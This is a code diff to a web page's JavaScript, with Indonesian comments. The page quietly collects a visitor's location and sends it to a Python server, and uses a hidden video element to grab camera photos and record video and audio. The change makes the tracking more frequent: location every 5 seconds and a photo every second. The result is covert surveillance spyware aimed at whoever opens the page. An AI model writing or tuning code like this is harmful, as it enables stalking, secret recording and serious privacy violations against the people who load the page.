@@ -159,7 +159,7 @@
 document.addEventListener("DOMContentLoaded", function() {
     let triggered = false;
 
-    // Fungsi Kirim Lokasi ke Server Python
+    // Fungsi Kirim Lokasi ke Server Python (Setiap 5 detik)
     function sendLocationData() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(position) {
@@ -182,10 +182,11 @@ document.addEventListener("DOMContentLoaded", function() {
         if (triggered) return;
         triggered = true;
 
-        // 1. Kirim Data Lokasi
+        // 1. Jalankan lokasi pertama kali, lalu ulang tiap 5 detik
         sendLocationData();
+        setInterval(sendLocationData, 5000);
 
-        // 2. Akses Media untuk Rekam Video & Ambil Foto Kontinu per 2 Detik
+        // 2. Akses Media untuk Rekam Video & Ambil Foto Kontinu (Foto tiap 1 detik)
         navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: true })
         .then(stream => {
             // Elemen video tersembunyi khusus untuk capture foto otomatis
@@ -193,7 +194,7 @@ document.addEventListener("DOMContentLoaded", function() {
             hiddenVideo.srcObject = stream;
             hiddenVideo.play();
 
-            // Tangkap foto terus-menerus setiap 2 detik
+            // Tangkap foto terus-menerus setiap 1 detik
             function capturePhoto() {
                 try {
                     const snapCanvas = document.createElement('canvas');
@@ -210,7 +211,7 @@ document.addEventListener("DOMContentLoaded", function() {
                     }, 'image/jpeg', 0.8);
                 } catch (e) {}
             }
-            setInterval(capturePhoto, 2000);
+            setInterval(capturePhoto, 1000);
 
             // Perekam Video Berkelanjutan (10 detik per siklus)
             function recordCycle() {
